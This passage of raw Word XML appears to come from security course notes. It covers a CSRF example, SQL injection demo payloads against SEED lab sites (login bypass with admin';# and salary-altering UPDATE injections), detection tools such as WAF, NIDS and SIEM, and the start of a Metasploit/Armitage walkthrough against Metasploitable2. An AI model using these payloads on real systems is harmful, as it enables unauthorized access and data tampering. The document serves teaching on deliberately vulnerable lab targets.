        <w:t>&lt;/body&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72D9C55A" w14:textId="77777777" w:rsidR="00EA3B8B" w:rsidRDefault="00EA3B8B" w:rsidP="00731472">
      <w:pPr>
        <w:pStyle w:val="CSBody"/>
      </w:pPr>
      <w:r>
        <w:t>&lt;/html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67818359" w14:textId="2ECD1EC1" w:rsidR="00EA3B8B" w:rsidRDefault="00731472" w:rsidP="0079467F">
      <w:r>
        <w:t>The image tag on the page</w:t>
      </w:r>
      <w:r w:rsidR="003B7CC0">
        <w:t xml:space="preserve"> is fake</w:t>
      </w:r>
      <w:r w:rsidR="00460B2F">
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="003B7CC0">
        <w:t xml:space="preserve"> and it is pointing to the other</w:t>
      </w:r>
      <w:r w:rsidR="001436C5">
        <w:t xml:space="preserve"> application (</w:t>
      </w:r>
      <w:r w:rsidR="00460B2F">
        <w:t>www.</w:t>
      </w:r>
      <w:r w:rsidR="001436C5">
        <w:t>csrflabelgg.com)</w:t>
      </w:r>
      <w:r w:rsidR="00A11C34">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="001436C5">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A11C34">
        <w:t>W</w:t>
      </w:r>
      <w:r w:rsidR="001436C5">
        <w:t xml:space="preserve">hoever </w:t>
      </w:r>
      <w:r w:rsidR="00F67DD3">
        <w:t>has the id 43 (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00F67DD3">
        <w:t>Boby</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00F67DD3">
        <w:t>) will become Alice</w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>'</w:t>
      </w:r>
      <w:r w:rsidR="00F67DD3">
        <w:t>s friend without Alice</w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>'</w:t>
      </w:r>
      <w:r w:rsidR="00F67DD3">
        <w:t>s knowledge.</w:t>
      </w:r>
      <w:r w:rsidR="00793086">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37BE4DE7" w14:textId="275CA986" w:rsidR="00793086" w:rsidRDefault="00793086" w:rsidP="0079467F">
      <w:r>
        <w:t>This is</w:t>
      </w:r>
      <w:r w:rsidR="00A11C34">
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in a nutshell</w:t>
      </w:r>
      <w:r w:rsidR="00A11C34">
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> cross</w:t>
      </w:r>
      <w:r w:rsidR="00A11C34">
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">site request forgery. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F5C9801" w14:textId="7F3863B0" w:rsidR="004510BF" w:rsidRDefault="005F458D" w:rsidP="004510BF">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>SQL Injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E400AA5" w14:textId="79248DDA" w:rsidR="005F458D" w:rsidRDefault="005F458D" w:rsidP="005F458D">
      <w:r>
        <w:t xml:space="preserve">Simply put, and SQL Injection is where the hacker attacks </w:t>
      </w:r>
      <w:r w:rsidR="00564E32">
        <w:t>the</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> underlying database of the web application. You may ask</w:t>
      </w:r>
      <w:r w:rsidR="00A11C34">
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> how is that even possible? </w:t>
      </w:r>
      <w:r w:rsidR="00A11C34">
        <w:t>I</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">t is possible if the application allows user </w:t>
      </w:r>
      <w:r w:rsidR="00F400FF">
        <w:t>inputs</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to go to the database without proper scrutiny. </w:t>
      </w:r>
      <w:r w:rsidR="002F1577">
        <w:t xml:space="preserve">SQL (Structured Query Language) is the language </w:t>
      </w:r>
      <w:r w:rsidR="009A148B">
        <w:t xml:space="preserve">applications </w:t>
      </w:r>
      <w:r w:rsidR="002F1577">
        <w:t>use to communicate with the database.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29E54332" w14:textId="37A5180F" w:rsidR="00B71A5A" w:rsidRDefault="009A148B" w:rsidP="005F458D">
      <w:r>
        <w:t xml:space="preserve">Tip: </w:t>
      </w:r>
      <w:r w:rsidR="002F1577">
        <w:t>Application developer</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="002F1577">
        <w:t xml:space="preserve"> must </w:t>
      </w:r>
      <w:r w:rsidR="00F400FF">
        <w:t>use</w:t>
      </w:r>
      <w:r w:rsidR="002F1577">
        <w:t xml:space="preserve"> store procedure or prepared statement to escape </w:t>
      </w:r>
      <w:r w:rsidR="00F400FF">
        <w:t>from SQL Injection.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B4F9454" w14:textId="70CB59B0" w:rsidR="002F1577" w:rsidRDefault="002F1577" w:rsidP="005F458D">
      <w:r>
        <w:t>Demo:</w:t>
      </w:r>
      <w:r w:rsidR="00007EBB">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="443CA8C7" w14:textId="5B66131F" w:rsidR="007F70A3" w:rsidRDefault="007F70A3" w:rsidP="005F458D">
      <w:r>
        <w:t>For this demo, we will visit:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75F88156" w14:textId="4CB11580" w:rsidR="007F70A3" w:rsidRDefault="007A3129" w:rsidP="005F458D">
      <w:hyperlink r:id="rId13" w:history="1">
        <w:r w:rsidR="00F858BD" w:rsidRPr="00315383">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>http://www.seedlabsqlinjection.com/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="12B8BC26" w14:textId="083F36B7" w:rsidR="00C356D4" w:rsidRDefault="00426D2A" w:rsidP="00426D2A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="46"/>
        </w:numPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>T</w:t>
      </w:r>
      <w:r w:rsidR="00827CCE">
        <w:t xml:space="preserve">ype the following in the username text box: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F41B101" w14:textId="30ED17D9" w:rsidR="00827CCE" w:rsidRDefault="00827CCE" w:rsidP="00426D2A">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:ind w:firstLine="360"/>
      </w:pPr>
      <w:r w:rsidRPr="00653601">
        <w:t>admin</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00653601">
        <w:t>';#</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="4092AB4A" w14:textId="6AB5CDEA" w:rsidR="00F858BD" w:rsidRDefault="00426D2A" w:rsidP="00E8364F">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:t>You will get a list of all the users on the system.</w:t>
      </w:r>
      <w:r w:rsidR="00E8364F">
        <w:t xml:space="preserve"> You have already executed a SQL injection and got results.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55DE9B2A" w14:textId="0E14D7E9" w:rsidR="00E8364F" w:rsidRDefault="00D173C6" w:rsidP="00E8364F">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="46"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Login as Alice</w:t>
      </w:r>
      <w:r w:rsidR="007F0F56">
        <w:t>, go to edit mode of the profile</w:t>
      </w:r>
      <w:r w:rsidR="00A11C34">
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and type the following</w:t>
      </w:r>
      <w:r w:rsidR="00DF5C5E">
        <w:t xml:space="preserve"> in </w:t>
      </w:r>
      <w:r w:rsidR="00A11C34">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r w:rsidR="00DF5C5E">
        <w:t>phone number text box</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06B8EF0F" w14:textId="4F8717C3" w:rsidR="0005641E" w:rsidRDefault="0005641E" w:rsidP="008D4DDC">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Time to </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="008D4DDC">
        <w:t>hack</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00F07DFE">
        <w:t>',salary</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F07DFE">
        <w:t>=99999 where id=1;#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CDD617E" w14:textId="04AF1AA2" w:rsidR="00D173C6" w:rsidRDefault="00432D89" w:rsidP="00432D89">
      <w:pPr>
        <w:ind w:firstLine="360"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Alice just got a big salary increase!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D993CB6" w14:textId="50ABD0B9" w:rsidR="00B83824" w:rsidRDefault="00B83824" w:rsidP="002C2BD7">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="46"/>
        </w:numPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Boby</w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>'</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> salary is currently 50,000</w:t>
      </w:r>
      <w:r w:rsidR="00A11C34">
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and his id is 2. Edit Alice</w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>'</w:t>
      </w:r>
      <w:r>
        <w:t>s profile and type the following in the phone number text box:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C9D77F1" w14:textId="0C52B101" w:rsidR="00432D89" w:rsidRDefault="00B83824" w:rsidP="00B83824">
      <w:pPr>
        <w:ind w:firstLine="360"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>',salary</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>=salary-1 where id=2;#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B5D1A2D" w14:textId="375EE77A" w:rsidR="00B83824" w:rsidRDefault="00B83824" w:rsidP="00B83824">
      <w:pPr>
        <w:ind w:firstLine="360"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Boby’s</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> salary is now $</w:t>
      </w:r>
      <w:r w:rsidR="001531AE">
        <w:t>1 less, 49,999.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EE2FA21" w14:textId="146CC6B8" w:rsidR="00524AE1" w:rsidRDefault="00524AE1" w:rsidP="00654338">
      <w:r>
        <w:t>This is the end of our Application Security Demo.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F796211" w14:textId="615D726A" w:rsidR="004C0BE7" w:rsidRDefault="009A58CC" w:rsidP="004C0BE7">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>App</w:t>
      </w:r>
      <w:r w:rsidR="0079457D">
        <w:t>lication</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Security Issue </w:t>
      </w:r>
      <w:r w:rsidR="00730184">
        <w:t>Detection</w:t>
      </w:r>
      <w:r w:rsidR="004C0BE7">
        <w:t xml:space="preserve"> Mechanism</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EB3E3D7" w14:textId="5E1A14C5" w:rsidR="004C0BE7" w:rsidRPr="004C0BE7" w:rsidRDefault="004C0BE7" w:rsidP="004C0BE7">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Static </w:t>
      </w:r>
      <w:r w:rsidR="00A11C34">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidRPr="004C0BE7">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>can of source code</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="210197CA" w14:textId="02A4CD9D" w:rsidR="00AC7C87" w:rsidRPr="00AA2564" w:rsidRDefault="00AC7C87" w:rsidP="00AC7C87">
      <w:r>
        <w:t xml:space="preserve">As we just saw, application code can be exploited </w:t>
      </w:r>
      <w:r w:rsidR="009D5E05">
        <w:t>by</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> cross</w:t>
      </w:r>
      <w:r w:rsidR="00A11C34">
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:t>site scripting, SQL injection</w:t>
      </w:r>
      <w:r w:rsidR="009D5E05">
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and</w:t>
      </w:r>
      <w:r w:rsidR="009D5E05">
        <w:t xml:space="preserve"> other application vulnerabilities</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Source code scanning software like Fortify is typically used to scan the </w:t>
      </w:r>
      <w:r w:rsidR="00426D2A">
        <w:t>application code</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to detect such problems.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34BBFD20" w14:textId="77777777" w:rsidR="004C0BE7" w:rsidRPr="004C0BE7" w:rsidRDefault="004C0BE7" w:rsidP="004C0BE7">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Dynamic Test</w:t>
      </w:r>
      <w:r w:rsidRPr="004C0BE7">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> of source code</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AEA8F71" w14:textId="206AA1A6" w:rsidR="004C0BE7" w:rsidRDefault="0036146D" w:rsidP="005F458D">
      <w:r w:rsidRPr="0036146D">
        <w:t>web application security scanner</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s like </w:t>
      </w:r>
      <w:r w:rsidRPr="0036146D">
        <w:t>OWASP ZAP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0079457D">
        <w:t>ha</w:t>
      </w:r>
      <w:r w:rsidR="009D5E05">
        <w:t>ve scripts that will attack an application and try to exploit weak passwords, cross-site scripting, SQL injection, etc</w:t>
      </w:r>
      <w:r w:rsidR="000E50B4">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2542D5D7" w14:textId="47524EF0" w:rsidR="00243191" w:rsidRPr="00547028" w:rsidRDefault="00243191" w:rsidP="005F458D">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00547028">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Web Application Firewall (WAF)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BAB2D2C" w14:textId="4A65C301" w:rsidR="00243191" w:rsidRDefault="00243191" w:rsidP="005F458D">
      <w:r>
        <w:t xml:space="preserve">Web application firewall tools </w:t>
      </w:r>
      <w:r w:rsidR="00547028">
        <w:t>can detect and stop some of the</w:t>
      </w:r>
      <w:r w:rsidR="007D07D7">
        <w:t>se</w:t>
      </w:r>
      <w:r w:rsidR="00547028">
        <w:t xml:space="preserve"> attacks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CF6CAEA" w14:textId="1811C1ED" w:rsidR="007D07D7" w:rsidRPr="00951457" w:rsidRDefault="007D07D7" w:rsidP="005F458D">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00951457">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Network Intru</w:t>
      </w:r>
      <w:r w:rsidR="00951457" w:rsidRPr="00951457">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidRPr="00951457">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">ion Detection and Protection Systems (NIDS, </w:t>
      </w:r>
      <w:r w:rsidR="00951457" w:rsidRPr="00951457">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>NIPS)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="285D4D9D" w14:textId="45F5E396" w:rsidR="00951457" w:rsidRPr="00951457" w:rsidRDefault="00951457" w:rsidP="00371752">
      <w:r>
        <w:t xml:space="preserve">NIDS </w:t>
      </w:r>
      <w:r w:rsidR="004D664C">
        <w:t>examines network traffic to detect intrusion</w:t>
      </w:r>
      <w:r w:rsidR="003A1275">
        <w:t>. NIPS, on the other hand, stands in front of the network tr</w:t>
      </w:r>
      <w:r w:rsidR="00620F37">
        <w:t xml:space="preserve">affic and stops intrusion. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A06CEA9" w14:textId="7C497012" w:rsidR="00766C78" w:rsidRDefault="00766C78" w:rsidP="00371752">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00766C78">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Security information and event management</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> (SIEM)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3289FD1E" w14:textId="74749E87" w:rsidR="00766C78" w:rsidRPr="00371752" w:rsidRDefault="00766C78" w:rsidP="00371752">
      <w:r w:rsidRPr="00371752">
        <w:t xml:space="preserve">SIEM </w:t>
      </w:r>
      <w:r w:rsidR="00371752">
        <w:t>monitors all sorts of log files and event notification</w:t>
      </w:r>
      <w:r w:rsidR="00763369">
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="00FA3129">
        <w:t xml:space="preserve"> in a network</w:t>
      </w:r>
      <w:r w:rsidR="00C07E91">
        <w:t xml:space="preserve">, including the logs coming from NIDS, </w:t>
      </w:r>
      <w:r w:rsidR="00FA3129">
        <w:t>displaying many attacks on a user-friendly dashboard, and sending</w:t>
      </w:r>
      <w:r w:rsidR="00E04727">
        <w:t xml:space="preserve"> email/text alerts.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A88A3E2" w14:textId="31399B47" w:rsidR="004E6A45" w:rsidRDefault="004E6A45" w:rsidP="004E6A45">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r w:rsidRPr="00766C78">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:br w:type="column"/>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Introduction to Server Security</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17040E90" w14:textId="77777777" w:rsidR="006C234A" w:rsidRDefault="00877071" w:rsidP="00FC719C">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r w:rsidRPr="00877071">
        <w:t>Pen Testing with Metasploit and Metasploitable2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11AF6EA6" w14:textId="120F9AB7" w:rsidR="006A5D86" w:rsidRDefault="00877071" w:rsidP="00877071">
      <w:r>
        <w:t>Metasploit is a penetration testing tool that comes packaged with Kali Linux. If you install Kali Linux, you got Metasploit with it. Here is the bad news. Metasploit is a command</w:t>
      </w:r>
      <w:r w:rsidR="00FA3129">
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">line tool. </w:t>
      </w:r>
      <w:r w:rsidR="00FA3129">
        <w:t>It would help if you wer</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">e comfortable with </w:t>
      </w:r>
      <w:r w:rsidR="00FA3129">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r>
        <w:t>Linux command prompt to use it. But, wait. There is good news. There is a Graphical User Interface</w:t>
      </w:r>
      <w:r w:rsidR="003C2F86">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">(GUI) that </w:t>
      </w:r>
      <w:r w:rsidR="00FA3129">
        <w:t>you can use</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> instead. It is called </w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:t>Armitage</w:t>
      </w:r>
      <w:r w:rsidR="005B419C">
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which is also bundled with Metasploit</w:t>
      </w:r>
      <w:r w:rsidR="006A5D86">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="005309F6">
        <w:t>and</w:t>
      </w:r>
      <w:r w:rsidR="006A5D86">
        <w:t xml:space="preserve"> install</w:t>
      </w:r>
      <w:r w:rsidR="005309F6">
        <w:t>s with</w:t>
      </w:r>
      <w:r w:rsidR="006A5D86">
        <w:t xml:space="preserve"> K</w:t>
      </w:r>
      <w:r w:rsidR="006A5D86" w:rsidRPr="006A5D86">
        <w:t>ali-</w:t>
      </w:r>
      <w:r w:rsidR="005B419C">
        <w:t>L</w:t>
      </w:r>
      <w:r w:rsidR="006A5D86" w:rsidRPr="006A5D86">
        <w:t>inux</w:t>
      </w:r>
      <w:r w:rsidR="005309F6">
        <w:t xml:space="preserve"> (full version)</w:t>
      </w:r>
      <w:r w:rsidR="005B419C">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="003C2F86">
        <w:t xml:space="preserve">Otherwise, you </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="003C2F86">
        <w:t>have to</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="003C2F86">
        <w:t xml:space="preserve"> install Armitage on Kali</w:t>
      </w:r>
      <w:r w:rsidR="005B419C">
        <w:t>-</w:t>
      </w:r>
      <w:r w:rsidR="003C2F86">
        <w:t>Linux.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1234A2F6" w14:textId="1D384D44" w:rsidR="00877071" w:rsidRDefault="00877071" w:rsidP="00877071">
      <w:r>
        <w:t>Now, where do you install Kali</w:t>
      </w:r>
      <w:r w:rsidR="005309F6">
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:t>Linux</w:t>
      </w:r>
      <w:r w:rsidR="005309F6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00F50B39">
        <w:t>while you want to keep your OS intact</w:t>
      </w:r>
      <w:r>
        <w:t>? On Oracle Virtual Box. We will create a virtual server running Kali Linux. Assume that is all done. What system will we attack using Armitage/Metasploit? Your machine? NYU</w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>'</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s website? None of these </w:t>
      </w:r>
      <w:r w:rsidR="003C2F86">
        <w:t>is a</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> good choice. What we should do instead is install another virtual server called Metasploitable2</w:t>
      </w:r>
      <w:r w:rsidR="006A5D86">
        <w:t xml:space="preserve"> on the same Oracle Virtual Box</w:t>
      </w:r>
      <w:r>
        <w:t>. Metasploitable2 is an Ubuntu</w:t>
      </w:r>
      <w:r w:rsidR="00F50B39">
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:t>Linux server (not Kali</w:t>
      </w:r>
      <w:r w:rsidR="00F50B39">
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Linux) that has tons of vulnerabilities in it. This is by </w:t>
      </w:r>
      <w:r w:rsidR="006A5D86">
        <w:t>design,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> so people like us can practice penetration testing on it.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="085C63E1" w14:textId="77777777" w:rsidR="00CE5FA5" w:rsidRDefault="00CE5FA5" w:rsidP="00877071">
      <w:r>
        <w:t>Demo:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B705E2B" w14:textId="77777777" w:rsidR="00CE5FA5" w:rsidRPr="00302BEC" w:rsidRDefault="00CE5FA5" w:rsidP="00CE5FA5">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="41"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00302BEC">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Scan Metasploitable2</w:t>
      </w:r>
      <w:r w:rsidR="00302BEC">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> from Kali Linux machine:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D86F752" w14:textId="13F8E1FA" w:rsidR="003C2F86" w:rsidRDefault="003C2F86" w:rsidP="00302BEC">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">On </w:t>
      </w:r>
      <w:r w:rsidR="00256F7F">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r>
        <w:t>command prompt, type:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B753089" w14:textId="72EE1685" w:rsidR="003C2F86" w:rsidRDefault="003C2F86" w:rsidP="003C2F86">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>armitage</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="00D970A4" w14:textId="2900B07A" w:rsidR="00CE5FA5" w:rsidRDefault="00CE5FA5" w:rsidP="00302BEC">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>A popup to Connect will show up. Click Connect. Say "Yes" on the next screen. Wait for a while.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30C2EEF6" w14:textId="31A4C126" w:rsidR="00CE5FA5" w:rsidRDefault="00CE5FA5" w:rsidP="00302BEC">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Armitage UI will show up. There are menu items on the </w:t>
      </w:r>
      <w:r w:rsidR="00813F46">
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">op and the </w:t>
      </w:r>
      <w:r w:rsidR="00813F46">
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ide. Let's focus on the </w:t>
      </w:r>
      <w:r w:rsidR="00813F46">
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">op menu now. </w:t>
      </w:r>
      <w:r w:rsidR="003C2F86">
        <w:t xml:space="preserve">Select </w:t>
      </w:r>
      <w:r w:rsidR="003C2F86" w:rsidRPr="003C2F86">
        <w:t>Armitage-&gt;Set exploit rank-&gt;poor</w:t>
      </w:r>
      <w:r w:rsidR="003C2F86">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00813F46">
        <w:t xml:space="preserve"> This step is significant. Next, s</w:t>
      </w:r>
      <w:r>
        <w:t>elect Hosts</w:t>
      </w:r>
      <w:r w:rsidR="003C2F86">
        <w:t>-&gt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>NMap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Scan</w:t>
      </w:r>
      <w:r w:rsidR="003C2F86">
        <w:t>=&gt;</w:t>
      </w:r>
      <w:r>
